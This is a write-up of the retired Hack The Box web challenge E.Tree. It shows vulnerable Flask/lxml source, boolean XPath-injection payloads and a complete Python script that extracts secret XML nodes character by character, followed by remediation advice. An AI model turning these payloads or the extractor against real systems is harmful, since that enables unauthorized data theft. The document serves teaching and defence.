---
title: "Hack The Box Challenge — E.Tree"
summary: "E.Tree turns unsafe XPath construction into a boolean oracle, allowing two XML secret fragments to be recovered character by character."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Easy"
solvedAt: 2026-09-09
publishedAt: 2026-09-09
tags:
  - web-security
  - xpath-injection
  - blind-injection
  - xml
  - response-oracle
  - source-code-review
tools:
  - unzip
  - ripgrep
  - Python
  - Requests
cves: []
htbUrl: "https://app.hackthebox.com/challenges/E.Tree"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge E.Tree. Retirement was reconfirmed on 9 September 2026 by the challenge page's available official write-up, consistent with HTB's retired-content guidance. The real flag, temporary target address and unrelated personal information have been removed. The original challenge package is not redistributed.

More retired Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

E.Tree exposes an employee search endpoint backed by an XML document and `lxml.etree`. Source review showed that the application places the submitted name directly inside an XPath predicate. A single quote can escape the intended string and add attacker-controlled boolean expressions.

A true expression returned `This millitary staff member exists.`, while a false expression returned the opposite result. This stable difference created a boolean oracle. The supplied XML also revealed that the test secret was split across two `selfDestructCode` elements. A Python script therefore tested the length and each character of both remote nodes, then joined the recovered fragments. The script completed successfully against the live challenge, and the recovered value was accepted by Hack The Box; the value itself is omitted.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `E.Tree` |
| Platform | Hack The Box |
| Category | Web |
| Difficulty | Easy |
| Status | Retired, reconfirmed 9 September 2026 |
| Released | 29 September 2023 |
| Core weakness | Boolean-based XPath injection |

The challenge presented an alien-themed Employee Directory, a public leaderboard and a JSON-backed search form. Its objective was to retrieve protected military staff information from the application.

## Provided material and evidence boundaries

The challenge supplied two components:

- An ephemeral HTTP service with `/`, `/leaderboard` and `/api/search` routes.
- A password-protected ZIP containing the Flask application, Docker configuration and `military.xml` test data.

The archive was used only for local source review. It is not included in this repository. Relevant, small code excerpts appear below because they explain the vulnerability; the full package and the real remote XML are not redistributed.

The preserved evidence includes the extraction transcript, application source excerpts, `ripgrep` results, the local XML structure, a failed submission of the bundled fake test value, true/false API responses and confirmation that the final extractor solved the challenge. The temporary container address is represented as `<TARGET>`.

## Initial analysis

The web interface accepted a staff name such as `John Doe` and displayed only an existence result. The leaderboard exposed several records from district `DSC-N-1547`, but did not directly reveal protected fields. Because the challenge included source code, inspecting the implementation was more useful than broad endpoint fuzzing.

The first archive extraction attempt used an incorrect password and skipped every encrypted file. Using the standard HTB challenge archive password successfully extracted the package:

```bash
unzip E.Tree.zip
```

The extracted layout immediately highlighted the likely attack surface:

```text
web_etree/challenge/
├── military.xml
├── requirements.txt
└── application/
    ├── app.py
    ├── blueprints/routes.py
    ├── static/js/main.js
    └── util.py
```

The API blueprint showed that `/api/search` accepts JSON and passes the `search` property directly to `search_staff`:

```python
@api.route('/search', methods=['POST'])
def api_search():
    name = request.json.get('search', '')
    return search_staff(name)
```

The browser-side JavaScript did not add meaningful protection; it sent the input to this endpoint as JSON.

## Identifying the weakness

The decisive code was in `application/util.py`:

```python
from lxml import etree

tree = etree.parse('military.xml')

def search_staff(name):
    query = f"/military/district/staff[name='{name}']"

    if tree.xpath(query):
        return {'success': 1, 'message': 'This millitary staff member exists.'}

    return {'failure': 1, 'message': 'This millitary staff member does not exist.'}
```

The f-string changes the submitted value into executable XPath syntax. For example, the input:

```text
' or '1'='1
```

produces the effective expression:

```text
/military/district/staff[name='' or '1'='1']
```

The injected comparison is true, so the predicate matches staff elements and the API returns its success object. The corresponding false control:

```text
' or '1'='2
```

matches nothing and returns the failure object. Testing both controls against the live service produced the expected opposite results:

```json
{"message":"This millitary staff member exists.","success":1}
{"failure":1,"message":"This millitary staff member does not exist."}
```

That response difference is sufficient for blind extraction even though the application never prints XML values.

## Locating the target data

`ripgrep` was not initially installed in the Kali environment, so it was added and then used to search the supplied files:

```bash
sudo apt install ripgrep
```

```bash
rg -n -i 'ElementTree|etree|xpath|findall|find\(|parse|xml|search|flag' .
```

The output confirmed the `lxml` dependency, the call to `etree.parse('military.xml')` and the unsafe `tree.xpath(query)` execution. A targeted XML search found two separate `selfDestructCode` elements containing pieces of a deliberately fake local test value:

```bash
rg -n -i 'HTB|flag|secret|code|password' military.xml
```

```text
87:  <selfDestructCode>[first test fragment]</selfDestructCode>
105: <selfDestructCode>[second test fragment]</selfDestructCode>
```

This revealed two important facts. First, the bundled value was only a fixture and not the live flag. Second, the extractor had to read both matching nodes in document order:

```text
(//selfDestructCode)[1]
(//selfDestructCode)[2]
```

## Building the boolean oracle

Before automating anything, the first character of the first node was tested manually:

```text
' or substring(string((//selfDestructCode)[1]),1,1)='H' or '1'='2
```

The application reported that a staff member existed. Replacing `H` with an incorrect character produced the failure response. This confirmed that arbitrary global XPath expressions could be evaluated from inside the vulnerable predicate.

The final oracle wraps any condition between two harmless false clauses:

```text
' or (<CONDITION>) or '1'='2
```

If `<CONDITION>` is true, `tree.xpath()` returns at least one staff element and the JSON contains `success: 1`. Otherwise it contains `failure: 1`.

## Verified extractor

The following is the sanitized version of the Python extractor used to solve the live challenge. It accepts the temporary base URL as an argument, recovers both nodes and joins them. The output containing the real flag is intentionally not reproduced.

```python
#!/usr/bin/env python3
import string
import sys
import time

import requests


ALPHABET = (
    string.ascii_letters
    + string.digits
    + "_{}-!@#$%^&*().,:/+="
)


def build_oracle(endpoint: str):
    session = requests.Session()

    def oracle(condition: str) -> bool:
        payload = f"' or ({condition}) or '1'='2"
        response = session.post(
            endpoint,
            json={"search": payload},
            timeout=10,
        )
        response.raise_for_status()
        return response.json().get("success") == 1

    return oracle


def extract_node(oracle, node_number: int) -> str:
    result = ""
    position = 1

    while oracle(
        f"string-length(string((//selfDestructCode)"
        f"[{node_number}])) >= {position}"
    ):
        for character in ALPHABET:
            condition = (
                f"substring(string((//selfDestructCode)"
                f"[{node_number}]),{position},1)="
                f'"{character}"'
            )

            if oracle(condition):
                result += character
                print(
                    f"[+] node {node_number}: "
                    f"recovered {len(result)} characters",
                    flush=True,
                )
                position += 1
                break
        else:
            raise RuntimeError(
                f"Character at position {position} "
                "is not in ALPHABET"
            )

        time.sleep(0.03)

    return result


def main() -> None:
    if len(sys.argv) != 2:
        raise SystemExit(
            f"Usage: {sys.argv[0]} http://<HOST>:<PORT>"
        )

    endpoint = sys.argv[1].rstrip("/") + "/api/search"
    oracle = build_oracle(endpoint)

    first = extract_node(oracle, 1)
    second = extract_node(oracle, 2)
    recovered = first + second

    if not (recovered.startswith("HTB{") and recovered.endswith("}")):
        raise RuntimeError("Recovered value has an unexpected format")

    print(f"[+] recovered an HTB-formatted value ({len(recovered)} chars)")
    print("[+] flag removed from the public write-up")


if __name__ == "__main__":
    main()
```

A sanitized invocation is:

```bash
python3 extract_flag.py http://<HOST>:<PORT>
```

For every position, the script first checks whether the node is long enough. It then tests candidate characters with `substring()`. A true response fixes that character and advances to the next position. After one node ends, the process repeats for the second node.

## Validation

Validation happened at three levels:

1. The source code demonstrated direct string interpolation into `tree.xpath()`.
2. Live true and false predicates returned stable, opposite JSON responses.
3. The Python extractor recovered two fragments, joined them into an `HTB{...}` value and solved the challenge successfully.

The actual value, its partial prefixes and any value-derived hash have been removed. The ephemeral host and port were also replaced with placeholders.

## What did not work

### Incorrect archive password

The first extraction attempt produced `incorrect password` for every encrypted file. This was an archive-access issue rather than part of the vulnerability. Retrying with the password provided through HTB's key control extracted the source successfully.

### Treating the bundled fixture as the flag

Concatenating the two local `selfDestructCode` values produced a convincing `HTB{...}` string, but HTB rejected it. The word `fake` embedded in the fixture was also a warning. The supplied XML documented the production structure; it did not contain the production secret. This failure redirected the solve toward remote blind extraction.

### Broad scanning before source review

No evidence supported brute-force content discovery or unrelated injection classes. Once the ZIP was available, the shortest verified path was to trace the search input from `routes.py` into `util.py`, confirm the XPath oracle manually and automate only the repetitive extraction.

## Why it works

XPath predicates are executable expressions, not plain string containers. The application assumes `name` will remain data, but single quotes terminate the intended string literal and allow boolean operators, functions and global node selectors to become part of the query.

`lxml.etree.xpath()` evaluates the complete resulting XPath expression. Its return value is then used as a Python truth test. A non-empty node set selects the success response, while an empty node set selects failure. That converts the application into a one-bit data channel.

The `string()`, `string-length()` and `substring()` XPath functions make the channel useful for extraction. The attacker does not need error messages or reflected XML; repeated yes-or-no questions reconstruct the target text.

## Defensive perspective

The safest repair is to stop constructing executable XPath from untrusted strings. `lxml` supports XPath variables, so the application can keep data separate from the expression:

```python
matches = tree.xpath(
    "/military/district/staff[name=$staff_name]",
    staff_name=name,
)
```

Additional controls should complement that primary fix:

| Weakness | Defensive action |
| --- | --- |
| XPath assembled with an f-string | Use XPath variables or fixed tree traversal APIs |
| Detailed success/failure oracle | Return a uniform response where enumeration is unnecessary |
| Unlimited automated probes | Add rate limiting and monitoring for repeated predicate-like input |
| Sensitive secrets in the searchable XML tree | Separate secrets from directory data and apply least privilege |
| No input constraints | Validate expected staff-name syntax as defense in depth |

Escaping individual quotes is brittle because XPath has multiple literal forms and expressive operators. Separating code from data addresses the root cause more reliably.

## Key takeaways

- Source review can reduce a broad web challenge to one precise data flow: JSON input, string interpolation and XPath evaluation.
- Always establish both a known-true and known-false condition before automating a blind injection.
- A boolean response is enough to extract data when the query language provides string and position functions.
- Supplied challenge fixtures may intentionally preserve the schema while replacing the production secret.
- Blind extraction should handle every relevant node and termination condition rather than assuming the secret is stored in one element.
- XPath variables provide the same security principle as parameterized SQL: keep untrusted data out of executable query syntax.

## References

- [Hack The Box — E.Tree](https://app.hackthebox.com/challenges/E.Tree)
- [Hack The Box — Streaming, Writeups and Walkthrough Guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [lxml — XPath and XSLT](https://lxml.de/xpathxslt.html)
- [OWASP — XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
